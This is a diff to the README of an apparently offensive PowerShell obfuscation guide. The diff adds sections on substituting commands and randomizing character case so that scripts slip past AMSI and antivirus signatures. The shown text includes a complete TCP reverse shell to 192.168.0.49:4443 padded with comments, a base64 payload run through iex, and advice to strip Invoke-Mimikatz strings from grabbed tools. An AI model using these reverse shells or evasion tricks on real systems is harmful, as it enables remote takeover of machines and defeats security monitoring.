@@ -1,11 +1,14 @@
 # PowahShell
 
 ## Techniques
-1. [Obfuscate Boolean Values](#Obfuscate-Boolean-Values)
-2. [Cmdlet Quote Interruption](#Cmdlet-Quote-Interruption)
-3. [Substitute Loops](Substitute-Loops)
-4. [Append Random Objects](Append-Random-Objects)
-5. [Append/Remove Comments](#Append\/Remove-Comments)
+1. [Randomize Variable Names](#Randomize-Variable-Names)
+2. [Obfuscate Boolean Values](#Obfuscate-Boolean-Values)
+3. [Cmdlet Quote Interruption](#Cmdlet-Quote-Interruption)
+4. [Substitute Loops](#Substitute-Loops)
+5. [Substitute Commands](#Substitute-Commands)
+6. [Append Random Objects](#Append-Random-Objects)
+7. [Append/Remove Comments](#Append\/Remove-Comments)
+8. [Randomize Char Cases](#Randomize-Char-Cases)
 
 ![image](https://user-images.githubusercontent.com/75489922/231490064-863ab464-84f3-4b38-9c9e-a48c23e3070c.png)
 
@@ -130,6 +133,15 @@ $virus = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64Stri
 iex $virus;
 ```
 
+## Substitute Commands
+You can always look for commands or even whole code blocks in a script that you can substitute with components that have the same/similar functionality. In the following classic reverse shell script, you can see the `pwd` command is used to retrieve the current working directory and reconstruct the shell's prompt value:  
+![image](https://user-images.githubusercontent.com/75489922/231549917-26ec7969-f2ea-4fbc-ae00-931e92947064.png)
+
+The `(pwd).Path` part can be replaced by the following weird, unorthodox little script and although it includes `pwd` it does server our purpose of breaking the signature while maintaining the functionality of the script:
+```
+"$($p = (Split-Path `"$(pwd)\\0x00\`");if ($p.trim() -eq ''){echo 'C:\'}else{echo $p})"
+```
+
 ## Append/Remove Comments
 ### Appending Comments
 Obfuscating a script by appending comments here and there might actually do the trick on its own.  
@@ -142,10 +154,16 @@ for example, a reverse shell command could be obfuscated like this:
 ```$TCPClient = New-Object <# SOME RANDOM COMMENT #> Net.Sockets.TCPClient('192.168.0.49', 4443);$NetworkStream = $TCPClient.GetStream() <# SOME RANDOM COMMENT #>;$StreamWriter = New-Object <# SOME RANDOM COMMENT #> IO.StreamWriter($NetworkStream);function WriteToStream ($String) <# SOME RANDOM COMMENT #> {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String);$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1); <# SOME RANDOM COMMENT #> $Output = try {Invoke-Expression $Command 2>&1 | Out-String} <# SOME RANDOM COMMENT #> catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()```
 
 ### Removing Comments
-There are malware-ish strings that will trigger AMSI immediatly and it should be a priority to replace them, when obfuscating scripts. Check this out:  
+There are malware-ish strings that will trigger AMSI immediately and it should be a priority to replace them, when obfuscating scripts. Check this out:  
 ![image](https://user-images.githubusercontent.com/75489922/231485178-99aded23-3a7a-46ab-ab30-2a10e5e3a332.png)
 
 Just by typing the string 'invoke-mimikatz' in the terminal AMSI is having a stroke (the script is not even present / loaded). 
 These strings may be found in comments as well, so it's a good idea to remove them, especially from FOS resources you grab from the internet (e.g. `Invoke-Mimikatz.ps1` from GitHub).  
   
-\*It's a good idea to remove comments generally, this was just an example.
+\*It's generally a good idea to remove comments, this was just an example.
+
+## Randomize Char Cases
+Probably the oldest trick in the book. Randomazing the character case of cmdlets and parameters might help:
+```
+inVOkE-eXpReSSioN -vErbOse "WHoAmI /aLL" -dEBug
+```
